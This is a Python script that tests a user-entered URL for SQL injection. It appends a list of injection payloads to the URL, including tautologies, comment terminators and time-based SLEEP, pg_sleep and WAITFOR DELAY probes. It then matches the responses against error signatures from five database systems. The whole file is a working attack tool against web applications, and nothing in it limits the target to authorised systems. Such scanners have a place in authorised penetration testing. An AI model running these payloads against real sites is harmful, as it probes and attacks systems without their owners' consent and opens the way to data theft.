import requests
import re
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# SQL error patterns for various databases
sql_errors = {
    "MySQL": [
        "you have an error in your sql syntax",
        "mysql_fetch_array",
        "warning: mysql",
        "mysql_num_rows",
        "mysql_fetch",
        "unknown column",
        "quoted string not properly terminated",
    ],
    "PostgreSQL": [
        "pg_exec",
        "warning: pg",
        "postgresql",
        "unterminated quoted string at or near",
        "syntax error at or near",
        "pg_query",
    ],
    "MSSQL": [
        "microsoft sql server",
        "sqlserver",
        "native client",
        "oledb",
        "unclosed quotation mark",
        "incorrect syntax near",
        "sqlcmd",
    ],
    "Oracle": [
        "ora-",
        "oracle",
        "pl/sql",
        "missing right parenthesis",
        "quoted string not properly terminated",
    ],
    "SQLite": [
        "sqlite_error",
        "sqlite3",
        "sqlite",
        "unrecognized token",
        "unclosed quotation mark",
    ],
}

sql_payloads = [
    "' OR '1'='1", "' OR '1'='1' -- ", "' OR '1'='1' /* ", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "' OR 'a'='a", "' AND 1=1--", "' AND 1=1#", "' AND 1=1/*", "'; WAITFOR DELAY '0:0:5' --",
    "' OR SLEEP(5) --", "' OR pg_sleep(5); --",
]

def test_sql_injection(url):
    logging.info(f"Testing URL for SQL injection: {url}")
    for payload in sql_payloads:
        injection_url = f"{url}{payload}"
        try:
            response = requests.get(injection_url)
            for dbms, errors in sql_errors.items():
                for error in errors:
                    if re.search(error, response.text, re.IGNORECASE):
                        logging.info(f"Possible SQL Injection vulnerability found! Payload: {payload} on URL: {url} with DBMS: {dbms}")
                        print(f"Possible SQL Injection vulnerability found on URL: {url} with payload: {payload}")
                        return True
        except requests.RequestException as e:
            logging.error(f"Error testing URL {url}: {e}")
    return False

if __name__ == "__main__":
    target_url = input("Enter the target URL to test for SQL injection: ")
    test_sql_injection(target_url)
